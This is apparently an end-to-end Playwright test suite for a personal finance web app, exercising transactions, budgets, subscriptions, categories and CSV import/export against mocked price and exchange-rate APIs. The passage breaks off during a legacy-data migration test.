// End-to-end browser tests for the whole app (Playwright + Chromium).
//   1. serve the repo:   python3 -m http.server 8765
//   2. run:              node tests/e2e.mjs            (ONLY=regex runs a subset of the test groups)
// PLAYWRIGHT=/path/to/playwright/index.mjs if Playwright isn't resolvable as 'playwright'.
// External price / exchange-rate APIs are mocked, so the run is deterministic and offline-safe.
import os from 'os';
import { mkdtempSync, mkdirSync } from 'fs';
const { chromium } = await import(process.env.PLAYWRIGHT || 'playwright');
const BASE = process.env.BASE || 'http://localhost:8765/';
const SHOTS = new URL('./shots/', import.meta.url).pathname;
mkdirSync(SHOTS, { recursive: true });
const TMP = mkdtempSync(os.tmpdir() + '/ledger-e2e-') + '/';
const results = [];
const problems = [];   // console errors, page errors, error toasts, crash pages
let cur = 'setup';

const b = await chromium.launch();
const ctx = await b.newContext({ viewport: { width: 1400, height: 1000 }, acceptDownloads: true });

// ---- mock every external API so the run is deterministic ----
const json = (route, body) => route.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: JSON.stringify(body) });
const LATEST = { EUR: 0.9, GBP: 0.8, CHF: 0.85, JPY: 150, CAD: 1.35, AUD: 1.5, NZD: 1.6, SEK: 10, NOK: 10.5, DKK: 6.7, PLN: 3.9, CZK: 22, RON: 4.5, HUF: 350, TRY: 34, INR: 84, SGD: 1.3, HKD: 7.8, CNY: 7.1, ZAR: 18, BRL: 5.4, MXN: 18 };
let frankCalls = [], fxDelay = 0, fxDown = false;
await ctx.route(/api\.frankfurter\.dev/, async route => {
  const u = new URL(route.request().url());
  frankCalls.push(u.pathname + u.search);
  if (fxDown) return route.fulfill({ status: 503, headers: { 'access-control-allow-origin': '*' }, body: '' });
  if (fxDelay) await new Promise(r => setTimeout(r, fxDelay));
  const syms = (u.searchParams.get('symbols') || '').split(',').filter(Boolean);
  if (syms.some(s => !LATEST[s])) return route.fulfill({ status: 404, headers: { 'access-control-allow-origin': '*' }, body: '{"message":"not found"}' });
  const pick = f => Object.fromEntries(syms.map(s => [s, LATEST[s] * f]));
  if (u.pathname.endsWith('/latest')) return json(route, { base: 'USD', rates: pick(1) });
  // timeseries: a handful of dates with a different rate so history is distinguishable
  const start = u.pathname.split('/').pop().replace('..', '');
  const d = new Date(start); const rates = {};
  for (let i = 0; i < 30; i++) { const k = new Date(d.getTime() + i * 15 * 864e5).toISOString().slice(0, 10); if (k > new Date().toISOString().slice(0, 10)) break; rates[k] = pick(1.05); }
  return json(route, { base: 'USD', start_date: start, rates });
});
await ctx.route(/api\.coinbase\.com\/v2\/exchange-rates/, route => json(route, { data: { currency: 'USD', rates: { ...Object.fromEntries(Object.entries(LATEST).map(([k, v]) => [k, String(v)])), AED: '3.6725', BGN: '1.76' } } }));
await ctx.route(/api\.coinbase\.com\/v2\/prices/, route => { const s = route.request().url().match(/prices\/([^-]+)-USD/)[1]; return s === 'NOPE' ? route.fulfill({ status: 404, headers: { 'access-control-allow-origin': '*' }, body: '{}' }) : json(route, { data: { amount: s === 'XYZ' ? '2.5' : '100' } }); });
await ctx.route(/api\.binance\.com/, route => json(route, [{ symbol: 'BTCUSDT', price: '60000' }, { symbol: 'ETHUSDT', price: '3000' }, { symbol: 'SOLUSDT', price: '150' }]));
await ctx.route(/finnhub\.io/, route => { const s = new URL(route.request().url()).searchParams.get('symbol'); return json(route, { c: s === 'BAD' ? 0 : 200 }); });

const p = await ctx.newPage();
p.on('console', m => { if (m.type() === 'error' && !/favicon|ERR_FILE_NOT_FOUND|status of 404|status of 503|example\.com/.test(m.text())) problems.push(`[${cur}] console: ${m.text()}`); });
p.on('pageerror', e => problems.push(`[${cur}] pageerror: ${e.message}`));
p.on('dialog', d => { problems.push(`[${cur}] unexpected browser dialog: ${d.message()}`); d.accept(); });

const sleep = ms => p.waitForTimeout(ms);
async function check(label) {
  const crash = await p.locator('h1', { hasText: 'Something went wrong' }).count();
  if (crash) problems.push(`[${cur}] crash page at ${label}: ${(await p.locator('pre.err').textContent()).slice(0, 400)}`);
  const errs = await p.locator('.toast.error').allTextContents();
  for (const e of errs) if (!/Type DELETE|Symbol is required|Exits are larger|Quantities must|Name is required|Map a column|Enter an amount|Pick a category|Give it a name|Every category needs|same name|already there|must be different/.test(e)) problems.push(`[${cur}] error toast at ${label}: ${e}`);
  const nan = await p.evaluate(() => { const t = document.querySelector('#main')?.innerText || ''; const m = t.match(/.{0,30}(NaN|undefined|\[object Object\]|Infinity).{0,30}/); return m ? m[0] : null; });
  if (nan) problems.push(`[${cur}] bad value at ${label}: …${nan}…`);
  const inputs = await p.evaluate(() => [...document.querySelectorAll('#main input')].filter(i => /NaN|undefined/.test(i.value)).map(i => i.name + '=' + i.value));
  if (inputs.length) problems.push(`[${cur}] bad input values at ${label}: ${inputs.join(', ')}`);
}
async function go(hash, wait = 350) { await p.evaluate(h => { location.hash = h; }, hash); await sleep(wait); await check(hash); }
async function test(name, fn) {
  if (process.env.ONLY && !new RegExp(process.env.ONLY).test(name)) return;
  cur = name; const before = problems.length;
  try { await fn(); await check('end'); results.push([name, problems.length === before ? 'PASS' : 'ISSUES']); }
  catch (e) { results.push([name, 'FAIL']); problems.push(`[${name}] THREW: ${e.message.split('\n')[0]}`); await p.screenshot({ path: SHOTS + name.replace(/\W+/g, '_') + '.png' }).catch(() => {}); }
}
const assert = (c, msg) => { if (!c) throw new Error('assert: ' + msg); };
const S = (fn, arg) => p.evaluate(fn, arg);  // run in page
async function reset(settings = {}) {
  await S(async st => { const s = await import('/js/store.js'); await s.clearAll(); await s.saveSettings({ tour: { done: true }, modeChosen: true, lastBackupAt: new Date().toISOString(), ...st }); }, settings);
  await p.reload(); await sleep(500);
}
async function modalBtn(label) { await p.locator('.modal-wrap footer button', { hasText: label }).last().click(); await sleep(300); }
async function fillModal(sel, val) { await p.locator('.modal-wrap ' + sel).fill(String(val)); }
async function toastText() { return (await p.locator('.toast').allTextContents()).join(' | '); }
const ROUTES = ['/', '/settings', '/spending', '/spending/transactions', '/spending/transactions?all=1', '/spending/calendar', '/spending/budgets', '/spending/recurring', '/spending/categories', '/networth', '/networth/update', '/networth/accounts', '/networth/analytics', '/networth/interest', '/networth/flows', '/networth/flows?y=2025', '/networth/plan', '/networth/cashflow', '/journal', '/journal/history', '/journal/insights', '/trading', '/trading/trades', '/nope'];

await p.goto(BASE); await sleep(600);

// ---------- shared helpers for spending ----------
const txCount = () => S(async () => (await import('/js/store.js')).all('txns').length);
const txs = () => S(async () => (await import('/js/store.js')).all('txns'));
async function openAdd() { await p.keyboard.press('Escape').catch(() => {}); await p.locator('body').click({ position: { x: 5, y: 5 } }).catch(() => {}); await p.keyboard.press('n'); await sleep(350); assert(await p.locator('.modal-wrap #txf').count() === 1, 'N opens the add dialog'); }
async function fillTxn({ type, amount, cat, date, note, ccy }) {
  if (amount != null) await fillModal('[name=amount]', amount);
  if (ccy) await p.selectOption('.modal-wrap [name=currency]', ccy);
  if (date) await fillModal('[name=date]', date);
  if (cat) await p.locator(`.modal-wrap .cat-chip:has(input[value="${cat}"])`).click();
  if (note != null) await fillModal('[name=note]', note);
}


// =============== empty-state crawl ===============
for (const mode of ['simple', 'pro']) await test(`empty crawl ${mode}`, async () => {
  await reset({ mode });
  for (const r of ROUTES) await go('#' + r);
  await go('#/networth/plan'); assert(/#\/networth\/analytics$/.test(p.url()), 'old FI page goes to Analytics: ' + p.url());
  await go('#/journal'); assert(await p.locator('#jf').count() === 1, 'journal page is back');
  await go('#/trading/trade/abc'); assert(/#\/$/.test(p.url()), 'old trade page sends you home: ' + p.url());
});

await test('first launch: chooser → estimates → tour with sample data', async () => {
  await S(async () => { const s = await import('/js/store.js'); await s.wipeEverything(); });
  await p.reload(); await sleep(600);
  assert(await p.locator('.mode-choose').count() === 1, 'chooser on first launch');
  await p.keyboard.press('n'); await sleep(200);
  assert(await p.locator('.modal-wrap').count() === 0, 'N does nothing before choosing a mode');
  await p.locator('[data-pick=simple]').click(); await sleep(600);
  assert(/#\/setup\?first=1/.test(p.url()) && await p.locator('#estf').count() === 1, 'estimates page next');
  assert(!(await p.locator('#estf [name=income], #estf [name=saving], #estf [name=currentAge]').count()), 'no income / FI questions');
  await p.fill('#estf [name=spending]', '2000'); await p.fill('#estf [name=budget]', '1800');
  await p.locator('[data-save]').click(); await sleep(1500);
  assert(await p.locator('.tour').count() === 1 && await S(async () => (await import('/js/store.js')).getSettings().tourDemo), 'tour runs on sample data');
  await p.locator('.tour-card [data-skip]').click(); await sleep(1200);
  const st = await S(async () => { const s = await import('/js/store.js'); return { n: s.all('txns').length + s.all('nwAccounts').length, est: s.getSettings().estimates?.spending, b: s.getSettings().budgets.total, d: s.getSettings().tourDemo }; });
  assert(st.n === 0 && st.est === 2000 && st.b === 1800 && !st.d, 'ending the tour removes sample data, keeps estimates ' + JSON.stringify(st));
  await S(async () => { const s = await import('/js/store.js'); await s.saveSettings({ lastBackupAt: new Date().toISOString() }); });
  await p.reload(); await sleep(500);
  assert(await p.locator('.mode-choose').count() === 0 && await p.locator('.tour').count() === 0, 'no chooser/tour on later visits');
});

await test('transactions: simple add / validate / edit / delete', async () => {
  await reset({ mode: 'simple', currency: 'EUR' });
  await go('#/spending');
  await openAdd();
  const vis = await p.$$eval('.modal-wrap [name]', els => [...new Set(els.filter(e => !e.closest('[hidden]') && e.type !== 'hidden').map(e => e.name))]);
  assert(JSON.stringify(vis) === JSON.stringify(['amount', 'currency', 'date', 'category', 'note']), 'simple form fields: ' + vis);
  await modalBtn('Save'); assert(/amount above zero/.test(await toastText()), 'amount required');
  await fillModal('[name=amount]', '12.5'); await modalBtn('Save'); assert(/Pick a category/.test(await toastText()), 'category required');
  await fillTxn({ cat: 'dining', note: 'Lunch' }); await modalBtn('Save'); await sleep(300);
  assert(await txCount() === 1, 'saved one');
  let t = (await txs())[0];
  const today = await S(async () => (await import('/js/ui.js')).today());
  assert(t.type === 'expense' && t.amount === 12.5 && t.category === 'dining' && t.date === today && t.currency === 'EUR', 'stored ' + JSON.stringify(t));
  // save & add another keeps going
  await openAdd(); await fillTxn({ amount: 40, cat: 'groceries', note: 'Lidl' }); await modalBtn('Save & add another'); await sleep(300);
  assert(await p.locator('.modal-wrap #txf').count() === 1, 'dialog reopened');
  assert(await p.locator('.modal-wrap .cat-chip input[value=groceries]').isChecked(), 'category remembered');
  await fillTxn({ amount: 8, note: 'Bread' }); await p.locator('.modal-wrap [name=note]').press('Enter'); await sleep(400);
  assert(await txCount() === 3, 'three saved (Enter saves)');
  // no income anywhere in the form
  await openAdd(); assert(!(await p.locator('.modal-wrap [data-type=income], .modal-wrap .cat-chip input[value=salary]').count()), 'no income option'); await p.keyboard.press('Escape'); await sleep(200);
  // edit from the list
  await go('#/spending/transactions');
  await p.locator('.txn', { hasText: 'Lunch' }).click(); await sleep(300);
  await fillModal('[name=amount]', '15'); await modalBtn('Save'); await sleep(300);
  assert((await txs()).find(x => x.note === 'Lunch').amount === 15, 'edited');
  // delete
  await p.locator('.txn', { hasText: 'Bread' }).click(); await sleep(300); await modalBtn('Delete'); await sleep(300);
  assert(await txCount() === 2 && !(await txs()).some(x => x.note === 'Bread'), 'deleted');
  // + Add button on page and from Overview
  await go('#/'); await p.locator('#main [data-quick-add]').first().click(); await sleep(300); assert(await p.locator('.modal-wrap #txf').count(), 'overview add'); await p.keyboard.press('Escape'); await sleep(150);
  await go('#/spending'); await check('dashboard with data');
});

await test('transactions: pro fields, repeat, exclude, filters, search', async () => {
  await S(async () => { const s = await import('/js/store.js'); await s.saveSettings({ mode: 'pro' }); });
  await go('#/spending/transactions');
  await openAdd();
  await fillTxn({ amount: 60, cat: 'dining', note: 'Team dinner' });
  await p.selectOption('.modal-wrap [name=sub]', 'Restaurants'); await fillModal('[name=merchant]', 'Sushi place'); await p.selectOption('.modal-wrap [name=method]', 'Credit card');
  await p.selectOption('.modal-wrap [name=kind]', 'need'); await fillModal('[name=tags]', 'work, friday'); await p.check('.modal-wrap [name=exclude]');
  await modalBtn('Save'); await sleep(300);
  let t = (await txs()).find(x => x.note === 'Team dinner');
  assert(t.sub === 'Restaurants' && t.merchant === 'Sushi place' && t.method === 'Credit card' && t.kind === 'need' && t.tags.join() === 'work,friday' && t.exclude, 'pro fields ' + JSON.stringify(t));
  // excluded doesn't count
  const spent = await S(async () => (await import('/js/spend/calc.js')).monthSummary().spent);
  assert(Math.abs(spent - (15 + 40)) < 1e-9, 'excluded left out of totals: ' + spent);
  // repeats → recurring
  await openAdd(); await fillTxn({ amount: 9.99, cat: 'subscriptions', note: 'YouTube Premium' }); await p.selectOption('.modal-wrap [name=repeat]', 'monthly'); await modalBtn('Save'); await sleep(300);
  const rec = await S(async () => (await import('/js/store.js')).all('recurring'));
  assert(rec.length === 1 && rec[0].freq === 'monthly' && rec[0].next > (await S(async () => (await import('/js/ui.js')).today())), 'recurring created with next date ' + JSON.stringify(rec[0]));
  assert((await txs()).find(x => x.note === 'YouTube Premium').recurringId === rec[0].id, 'txn linked to recurring');
  // filters & search
  await go('#/spending/transactions?q=sushi'); assert(await p.locator('.txn').count() === 1, 'search by merchant');
  await go('#/spending/transactions?cat=groceries'); assert(await p.locator('.txn').count() === 1, 'category filter');
  await go('#/spending/transactions?q=%23work'); await go('#/spending/transactions?q=work'); assert(await p.locator('.txn').count() === 1, 'search tags');
  await go('#/spending/transactions?all=1'); assert(await p.locator('.txn').count() === 4, 'all time shows all: ' + await p.locator('.txn').count());
  await go('#/spending/transactions?m=2020-01'); assert(await p.locator('.empty').count() === 1, 'empty month');
  // filter controls
  await go('#/spending/transactions'); await p.selectOption('[data-f=cat]', 'dining'); await sleep(300); assert(/cat=dining/.test(p.url()), 'filter updates url'); await go('#/spending/transactions');
  await p.fill('[data-f=text]', 'lidl'); await p.locator('[data-f=text]').press('Enter'); await sleep(300); assert(await p.locator('.txn').count() === 1, 'search box');
  // simple edit keeps pro fields
  await S(async () => { const s = await import('/js/store.js'); await s.saveSettings({ mode: 'simple' }); });
  await go('#/spending/transactions?q=team'); await p.locator('.txn').first().click(); await sleep(300); await fillModal('[name=amount]', '61'); await modalBtn('Save'); await sleep(300);
  t = (await txs()).find(x => x.note === 'Team dinner');
  assert(t.amount === 61 && t.merchant === 'Sushi place' && t.exclude, 'simple edit keeps pro fields');
});

await test('calendar', async () => {
  const m = await S(async () => (await import('/js/spend/calc.js')).currentMonth());
  await S(async m => { const s = await import('/js/store.js'); await s.put('txns', { type: 'expense', amount: 100, currency: 'EUR', category: 'shopping', date: `${m}-02`, note: 'Shoes' }); }, m);
  await go('#/spending/calendar');
  assert(await p.locator('.cal a.cell').count() >= 28, 'month grid');
  await p.locator('.cal a.cell', { hasText: /^\s*2\b/ }).first().click(); await sleep(400);
  assert(/day=\d{4}-\d\d-02/.test(p.url()) && await p.locator('.txn', { hasText: 'Shoes' }).count() === 1, 'day panel shows its transactions');
  await p.locator('.card [data-add]').first().click(); await sleep(300);
  assert((await p.inputValue('.modal-wrap [name=date]')).endsWith('-02'), 'add prefilled with selected day'); await p.keyboard.press('Escape'); await sleep(200);
  await go(`#/spending/calendar?m=${await S(async m => (await import('/js/spend/calc.js')).shiftMonth(m, -1), m)}`);
});

await test('budgets: save, pace, safe per day, fill averages', async () => {
  await reset({ mode: 'pro', currency: 'EUR' });
  const r = await S(async () => {
    const s = await import('/js/store.js'); const S = await import('/js/spend/calc.js'); const u = await import('/js/ui.js');
    const m = S.currentMonth(), pm = S.shiftMonth(m, -1), ppm = S.shiftMonth(m, -2);
    for (const [k, a] of [[pm, 300], [ppm, 500]]) await s.put('txns', { type: 'expense', amount: a, currency: 'EUR', category: 'groceries', date: `${k}-10` });
    await s.put('txns', { type: 'expense', amount: 200, currency: 'EUR', category: 'groceries', date: u.today() });
    return { m };
  });
  await go('#/spending/budgets');
  await p.fill('#bf [name=total]', '1000'); await p.fill('#bf [name="c:groceries"]', '400'); await p.locator('#bf button.primary').click(); await sleep(400);
  let b = await S(async () => (await import('/js/store.js')).getSettings().budgets);
  assert(b.total === 1000 && b.byCat.groceries === 400, 'saved ' + JSON.stringify(b));
  const s = await S(async () => { const S = await import('/js/spend/calc.js'); const x = S.monthSummary(); return { left: x.left, safe: x.safeToday, daysLeft: x.daysLeft, n: x.n, day: x.dayNow }; });
  assert(s.left === 800 && Math.abs(s.safe - 800 / s.daysLeft) < 1e-9 && s.daysLeft === s.n - s.day + 1, 'left & safe per day ' + JSON.stringify(s));
  // removing a limit really removes it
  await go('#/spending/budgets'); await p.fill('#bf [name="c:groceries"]', ''); await p.locator('#bf button.primary').click(); await sleep(400);
  b = await S(async () => (await import('/js/store.js')).getSettings().budgets); assert(!('groceries' in b.byCat), 'limit removed ' + JSON.stringify(b));
  await go('#/spending/budgets'); await p.locator('[data-fill]').click(); await sleep(200);
  assert(await p.inputValue('#bf [name="c:groceries"]') === '400', 'filled from 2-month average (300+500)/2: ' + await p.inputValue('#bf [name="c:groceries"]'));
  await go('#/spending'); await go('#/');
});

await test('bills & subscriptions', async () => {
  await reset({ mode: 'pro', currency: 'EUR' });
  const d = await S(async () => { const u = await import('/js/ui.js'); const x = new Date(); x.setMonth(x.getMonth() - 2); return { past: u.dayKey(x), today: u.today() }; });
  await go('#/spending/recurring');
  await p.locator('[data-new=bill]').first().click(); await sleep(300);
  await fillModal('[name=name]', 'Rent'); await fillModal('[name=amount]', '900'); await p.selectOption('.modal-wrap [name=category]', 'housing'); await fillModal('[name=next]', d.past);
  await modalBtn('Save'); await sleep(500);
  let tx = await txs();
  assert(tx.filter(t => t.note === 'Rent').length === 3, 'past due payments added automatically: ' + tx.length);
  let r = (await S(async () => (await import('/js/store.js')).all('recurring')))[0];
  assert(r.next > d.today, 'next moved into the future ' + r.next);
  // reminder-only item → Mark paid
  await p.locator('[data-new=bill]').first().click(); await sleep(300);
  await fillModal('[name=name]', 'Gym'); await fillModal('[name=amount]', '40'); await p.selectOption('.modal-wrap [name=category]', 'health'); await fillModal('[name=next]', d.past); await p.uncheck('.modal-wrap [name=auto]');
  await modalBtn('Save'); await sleep(400);
  assert((await txs()).filter(t => t.note === 'Gym').length === 0, 'reminder not auto-added');
  assert(await p.locator('.callout', { hasText: 'past due' }).count() === 1, 'overdue callout');
  await p.locator('tr', { hasText: 'Gym' }).locator('[data-paid]').click(); await sleep(400);
  assert((await txs()).filter(t => t.note === 'Gym').length === 1, 'mark paid logs one');
  // yearly subscription cost
  await S(async () => { const s = await import('/js/store.js'); await s.put('nwAccounts', { id: 'rev', name: 'Revolut', kind: 'asset', category: 'cash', currency: 'EUR' }); });
  await go('#/spending/recurring');
  await p.locator('[data-new=sub]').first().click(); await sleep(300);
  assert(await p.inputValue('.modal-wrap [name=kind]') === 'sub' && await p.inputValue('.modal-wrap [name=category]') === 'subscriptions', 'subscription preset');
  await fillModal('[name=name]', 'Netflix'); await fillModal('[name=amount]', '15'); await fillModal('[name=next]', d.today.slice(0, 8) + '28'); await p.locator('.modal-wrap [name=next]').dispatchEvent('change');
  assert(/every month on the 28th/.test(await p.locator('.modal-wrap #sched').textContent()), 'schedule text: ' + await p.locator('.modal-wrap #sched').textContent());
  await p.selectOption('.modal-wrap [name=accountId]', 'rev');
  await modalBtn('Save'); await sleep(400);
  const nf = (await S(async () => (await import('/js/store.js')).all('recurring'))).find(x => x.name === 'Netflix');
  assert(nf.isSub === true && nf.accountId === 'rev' && nf.day === 28, 'stored as subscription with account ' + JSON.stringify(nf));
  const subs = await p.locator('.stat', { has: p.locator('.stat-label', { hasText: /^Subscriptions/ }) }).textContent();
  assert(/15/.test(subs) && /180/.test(subs), 'subscriptions 15 / month, 180 / year: ' + subs);
  // tabs: Rent is a bill, Netflix a subscription
  await go('#/spending/recurring?show=subs'); assert(await p.locator('tbody tr').count() === 1 && await p.locator('tbody tr', { hasText: 'Netflix' }).count() === 1, 'active subscriptions tab');
  await go('#/spending/recurring?show=bills'); assert(await p.locator('tbody tr', { hasText: 'Rent' }).count() === 1 && await p.locator('tbody tr', { hasText: 'Netflix' }).count() === 0, 'bills tab');
  assert(await p.locator('dl.kv', { hasText: 'Revolut' }).count() === 1, 'by-account card');
  // shows on the Spending page, editable from there
  await go('#/spending');
  assert(await p.locator('.sub-item', { hasText: 'Netflix' }).count() === 1 && /Revolut/.test(await p.locator('.sub-item', { hasText: 'Netflix' }).textContent()), 'active subscriptions card on Spending');
  await p.locator('[data-add-sub]').click(); await sleep(300); assert(await p.inputValue('.modal-wrap [name=kind]') === 'sub', 'add subscription from Spending'); await p.keyboard.press('Escape'); await sleep(200);
  await p.locator('.sub-item', { hasText: 'Netflix' }).click(); await sleep(300); assert(await p.inputValue('.modal-wrap [name=name]') === 'Netflix', 'edit from Spending'); await p.keyboard.press('Escape'); await sleep(200);
  // charges carry the account
  await S(async () => { const s = await import('/js/store.js'); const u = await import('/js/ui.js'); const r = s.all('recurring').find(x => x.name === 'Netflix'); await s.put('recurring', { ...r, next: u.today() }); await (await import('/js/spend/calc.js')).postDueRecurring(); });
  assert((await txs()).find(t => t.note === 'Netflix')?.accountId === 'rev', 'charge carries the account');
  // pause moves it to the Paused tab
  await go('#/spending/recurring?show=subs');
  // pause / resume / edit / delete
  await p.locator('tr', { hasText: 'Netflix' }).locator('[data-pause]').click(); await sleep(300);
  assert((await S(async () => (await import('/js/store.js')).all('recurring'))).find(x => x.name === 'Netflix').paused, 'paused');
  await go('#/spending/recurring?show=paused');
  await p.locator('tr', { hasText: 'Netflix' }).locator('[data-pause]').click(); await sleep(300);
  await go('#/spending/recurring?show=all');
  await p.locator('tr', { hasText: 'Netflix' }).locator('[data-edit]').click(); await sleep(300); await fillModal('[name=amount]', '18'); await modalBtn('Save'); await sleep(300);
  await p.locator('tr', { hasText: 'Netflix' }).locator('[data-edit]').click(); await sleep(300); await modalBtn('Delete'); await sleep(250); await p.locator('.modal-wrap footer button').last().click(); await sleep(300);
  assert(!(await S(async () => (await import('/js/store.js')).all('recurring'))).some(x => x.name === 'Netflix'), 'deleted');
  // monthly-day clamping: 31st in a 30-day month
  const nd = await S(async () => { const S = await import('/js/spend/calc.js'); return [S.nextDate({ freq: 'monthly', day: 31 }, '2026-01-31'), S.nextDate({ freq: 'monthly', day: 31 }, '2026-02-28'), S.nextDate({ freq: 'yearly', day: 29 }, '2028-02-29'), S.nextDate({ freq: 'weekly' }, '2026-12-29')]; });
  assert(nd.join() === '2026-02-28,2026-03-31,2029-02-28,2027-01-05', 'date maths ' + nd);
  // auto-post on app open
  await S(async () => { const s = await import('/js/store.js'); const r = s.all('recurring').find(x => x.name === 'Rent'); const u = await import('/js/ui.js'); await s.put('recurring', { ...r, next: u.today() }); });
  const before = (await txs()).length; await p.reload(); await sleep(700);
  assert((await txs()).length === before + 1, 'due bill posted when the app opens');
  await go('#/'); await go('#/spending/calendar');
});

await test('categories: rename, add, remove, need/want, reset', async () => {
  await reset({ mode: 'pro' });
  await S(async () => { const s = await import('/js/store.js'); await s.put('txns', { type: 'expense', amount: 10, currency: 'USD', category: 'dining', date: (await import('/js/ui.js')).today() }); });
  await go('#/spending/categories');
  await p.locator('tr[data-id=dining] [data-k=name]').fill('Restaurants & cafés');
  await p.selectOption('tr[data-id=dining] [data-k=kind]', 'need');
  await p.locator('[data-addc]').click(); await sleep(150);
  await p.locator('#rows tr:last-child [data-k=name]').fill('Pets'); await p.locator('#rows tr:last-child [data-k=emoji]').fill('🐶'); await p.locator('#rows tr:last-child [data-k=subs]').fill('Food, Vet');
  await p.locator('tr[data-id=travel] [data-rm]').click(); await sleep(150);
  await p.locator('#cf button.primary').click(); await sleep(400);
  const cats = await S(async () => (await import('/js/store.js')).getSettings().categories);
  assert(cats.find(c => c.id === 'dining').name === 'Restaurants & cafés' && cats.find(c => c.id === 'dining').kind === 'need' && cats.some(c => c.name === 'Pets' && c.subs.join() === 'Food,Vet') && !cats.some(c => c.id === 'travel'), 'saved ' + JSON.stringify(cats.map(c => c.name)));
  // removing a used category asks
  await go('#/spending/categories'); await p.locator('tr[data-id=dining] [data-rm]').click(); await sleep(250);
  assert(await p.locator('.modal-wrap', { hasText: '1 transaction' }).count() === 1, 'warns when used'); await p.keyboard.press('Escape'); await sleep(150);
  // duplicate / empty names rejected
  await p.locator('tr[data-id=groceries] [data-k=name]').fill('Pets'); await p.locator('#cf button.primary').click(); await sleep(300);
  assert(/same name/.test(await toastText()), 'duplicate rejected');
  await go('#/spending'); const n = await S(async () => (await import('/js/spend/calc.js')).monthSummary().needs); assert(n === 10, 'need/want change applied: ' + n);
  await go('#/spending/categories'); await p.locator('[data-reset]').click(); await sleep(200); await p.locator('.modal-wrap footer button').last().click(); await sleep(400);
  assert(await S(async () => (await import('/js/store.js')).getSettings().categories) === null, 'reset');
  await go('#/spending/transactions');
});

await test('bank CSV import & export', async () => {
  const fs = await import('fs');
  await reset({ mode: 'pro', currency: 'EUR' });
  await S(async () => { const s = await import('/js/store.js'); await s.put('txns', { type: 'expense', amount: 5, currency: 'EUR', category: 'dining', date: '2026-01-01', merchant: 'STARBUCKS 123', note: 'coffee' }); });
  await go('#/spending/transactions');
  const doImport = async (file, tweak) => { const [fc] = await Promise.all([p.waitForEvent('filechooser'), p.locator('[data-import]').first().click()]); await fc.setFiles(file); await sleep(500); if (tweak) await tweak(); await modalBtn('Import'); await sleep(600); };
  fs.writeFileSync(TMP + 'bank1.csv', '﻿Date;Description;Amount;Currency\n15.03.2026;STARBUCKS 123;-4,50;EUR\n16.03.2026;SALARY ACME;3.200,00;EUR\n17.03.2026;Unknown shop;-1.234,56;EUR\n;broken;;\n');
  await doImport(TMP + 'bank1.csv', async () => { await p.selectOption('.modal-wrap [name=_datefmt]', 'dmy'); });
  let t = (await txs()).filter(x => x.imported);
  const sb = t.find(x => x.merchant === 'STARBUCKS 123'), sal = t.find(x => x.merchant === 'SALARY ACME'), un = t.find(x => x.merchant === 'Unknown shop');
  assert(t.length === 2 && sb.category === 'dining' && sb.amount === 4.5 && sb.date === '2026-03-15' && !sal && un.amount === 1234.56 && un.category === 'other', 'parsed ' + JSON.stringify(t));
  assert(/1 rows? without/.test(await toastText()) && /1 money-in/.test(await toastText()), 'broken row + money-in reported: ' + await toastText());
  // re-import: duplicates skipped
  await p.evaluate(() => document.querySelectorAll('.toast').forEach(t => t.remove()));
  await doImport(TMP + 'bank1.csv', async () => { await p.selectOption('.modal-wrap [name=_datefmt]', 'dmy'); });
  assert((await txs()).filter(x => x.imported).length === 2 && /2 already there/.test(await toastText()), 'duplicates skipped: ' + await toastText());
  // debit / credit columns
  fs.writeFileSync(TMP + 'bank2.csv', 'Posted,Payee,Debit,Credit\n03/20/2026,Shell,45.00,\n03/21/2026,Refund,,12.00\n');
  await doImport(TMP + 'bank2.csv', async () => { await p.selectOption('.modal-wrap [name=_datefmt]', 'mdy'); });
  const sh = (await txs()).find(x => x.merchant === 'Shell'), rf = (await txs()).find(x => x.merchant === 'Refund');
  assert(sh && sh.type === 'expense' && sh.amount === 45 && sh.date === '2026-03-20' && !rf, 'debit/credit ' + JSON.stringify([sh, rf]));
  // export
  const [dl] = await Promise.all([p.waitForEvent('download'), p.locator('[data-export]').click()]);
  const csv = fs.readFileSync(await dl.path(), 'utf8');
  assert(csv.split('\n').length === 5 && /date,amount,currency/.test(csv) && /paid_from_account/.test(csv) && /Unknown shop/.test(csv), 'export ' + csv.split('\n').length);
});

await test('calc: month summary, usual spending', async () => {
  await reset({ mode: 'pro', currency: 'USD' });
  const r = await S(async () => {
    const s = await import('/js/store.js'); const S = await import('/js/spend/calc.js'); const N = await import('/js/networth/calc.js'); const u = await import('/js/ui.js');
    const m = S.currentMonth(), pm = S.shiftMonth(m, -1), p2 = S.shiftMonth(m, -2);
    const add = (date, amount, type = 'expense', category = 'groceries', extra = {}) => s.put('txns', { date, amount, type, category, currency: 'USD', ...extra });
    await add(`${pm}-05`, 1000, 'income', 'salary'); await add(`${pm}-06`, 600); await add(`${pm}-07`, 100, 'expense', 'dining');
    await add(`${p2}-05`, 2000, 'income', 'salary'); await add(`${p2}-06`, 1000);
    await add(u.today(), 50); await add(u.today(), 999, 'expense', 'other', { exclude: true });
    const ms = S.monthSummary(pm);
    return { b: N.baseline(), sm: N.spendMonths(), ms: { spent: ms.spent, noSpend: ms.noSpend, n: ms.n, needs: ms.needs, wants: ms.wants, keys: Object.keys(ms) } };
  });
  assert(r.ms.spent === 700 && r.ms.noSpend === r.ms.n - 2 && r.ms.needs === 600 && r.ms.wants === 100 && !r.ms.keys.some(k => /income|saved|rate/.test(k)), 'month summary, no income fields ' + JSON.stringify(r.ms));
  assert(r.b.realMonths === 1 && Math.abs(r.b.avgExpenses - 700) < 1e-9 && !r.b.isEstimate, 'usual spending from complete months after the first: ' + JSON.stringify(r.b));
  assert(r.sm.every(x => !('income' in x)), 'spend months ignore income');
  await go('#/networth'); await go('#/networth/analytics'); await go('#/spending');
  assert(await p.locator('.note', { hasText: 'income entr' }).count() === 1, 'legacy income entries noted');
  await p.locator('[data-del-income]').click(); await sleep(250); await p.locator('.modal-wrap footer button').last().click(); await sleep(400);
  assert(!(await txs()).some(t => t.type === 'income') && (await txs()).length === 5, 'old income entries deleted, expenses kept');
});

await test('legacy data migration', async () => {
  // build a database the way the old trading-journal version left it
  await p.evaluate(async () => { const s = await import('/js/store.js'); await s.clearAll(); });
  await p.goto(BASE + '#/settings'); await sleep(300);
  await p.evaluate(async () => {
    await new Promise((res, rej) => { const d = indexedDB.deleteDatabase('ledgerline'); d.onsuccess = res; d.onerror = rej; d.onblocked = res; });
  }).catch(() => {});
  const ctx2 = await b.newContext({ viewport: { width: 1300, height: 900 } });
  await ctx2.route(/frankfurter|coinbase|binance|finnhub/, r => r.fulfill({ status: 503, body: '' }));
